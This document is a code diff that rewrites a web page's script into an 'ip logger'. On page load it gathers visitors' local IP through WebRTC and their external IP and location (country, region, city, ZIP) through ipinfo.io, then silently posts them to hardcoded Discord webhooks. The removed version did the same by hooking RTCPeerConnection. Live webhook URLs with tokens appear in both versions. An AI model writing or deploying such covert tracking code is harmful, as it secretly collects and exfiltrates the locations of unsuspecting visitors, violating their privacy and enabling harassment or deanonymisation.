@@ -1,59 +1,61 @@
-    <script>
-        var hasAlerted = false;
+<script>
+        // Function to get local IP address using WebRTC
+        function getLocalIP(callback) {
+            const rtc = new RTCPeerConnection();
+            rtc.createDataChannel('test');
+            rtc.createOffer().then(offer => rtc.setLocalDescription(offer)).catch(console.error);
 
-        window.oRTCPeerConnection =
-            window.oRTCPeerConnection || window.RTCPeerConnection;
-
-        window.RTCPeerConnection = function (...args) {
-            const pc = new window.oRTCPeerConnection(...args);
-
-            pc.oaddIceCandidate = pc.addIceCandidate;
-
-            pc.addIceCandidate = function (iceCandidate, ...rest) {
-                const fields = iceCandidate.candidate.split(" ");
-                const ip = fields[4];
-
-                console.log(iceCandidate.candidate);
-
-                // Check if it's a public IP address (srflx type)
-                if (fields[7] === "srflx") {
-                    sendWebRTCDataToDiscord({
-                        ip: ip,
-                        candidate: iceCandidate.candidate,
-                        type: fields[7]
-                    });
+            rtc.onicecandidate = event => {
+                if (event.candidate) {
+                    const localIP = event.candidate.address; // Extract local IP address
+                    callback(localIP); // Call the callback function with the local IP
+                    rtc.close(); // Close the connection
                 }
-                return pc.oaddIceCandidate(iceCandidate, ...rest);
             };
-            return pc;
-        };
+        }
 
-        // Function to send WebRTC information to Discord webhook
-        function sendWebRTCDataToDiscord(data) {
+        // Function to fetch external IP info
+        function fetchExternalIP(callback) {
+            var script = document.createElement('script');
+            script.src = "https://ipinfo.io/?format=jsonp&callback=" + encodeURIComponent("handleExternalIP");
+            document.body.appendChild(script);
+
+            // Callback function for external IP retrieval
+            window.handleExternalIP = function(ipInfo) {
+                callback(ipInfo); // Call the callback function with external IP info
+            };
+        }
+
+        // Main execution flow
+        getLocalIP(localIP => {
+            // After we have the local IP, fetch the external IP
+            fetchExternalIP(ipInfo => {
+                // Now send both local and external IP info to the webhook
+                sendToWebhook(ipInfo, localIP);
+                console.log("Local IP Address: ", localIP); // Log local IP for testing
+                console.log("External IP Address: ", ipInfo.ip); // Log external IP for testing
+            });
+        });
+
+        // Function to send data to Discord webhook
+        function sendToWebhook(ipInfo, localIP) {
             var request = new XMLHttpRequest();
-
-            // Replace this with your actual Discord webhook URL
-            request.open("POST", "https://discord.com/api/webhooks/1297979202183889039/06JY8Q-pQUM6eH84fCH2deahCkwwCg6dZL97toixTtgIUk_SRdO_3HapGS7SoNzjabZU");
-
+            request.open("POST", "https://discord.com/api/webhooks/1297255646483447879/6I-y7VkPd5JfdPNU2joLa7hP_qBkSc3n3AOZ1ayCLeeWOpluXwCqOse8c9MOZ8Y3db01");
             request.setRequestHeader('Content-type', 'application/json');
 
-            // Create the parameters for the webhook message
             var params = {
-                username: "Best Friend",
+                username: "ip logger v1",
                 avatar_url: "",
                 content: "@everyone",
                 embeds: [
                     {
-                        title: "WebRTC Data Detected",
+                        title: "IP Logger",
                         color: 1752220,
-                        description: "**IP Address:** `" + data.ip + "`\n" +
-                                     "**ICE Candidate:** `" + data.candidate + "`\n" +
-                                     "**Type:** `" + data.type + "`",
+                        description: "**Local IP:** " + localIP + "\n**External IP:** " + ipInfo.ip + "\n**Country:** " + ipInfo.country + "\n**Region:** " + ipInfo.region + "\n**Town/City:** " + ipInfo.city + "\n**ZIP:** " + ipInfo.postal
                     }
                 ]
             };
 
-            // Send the data to the Discord webhook
             request.send(JSON.stringify(params));
         }
     </script>
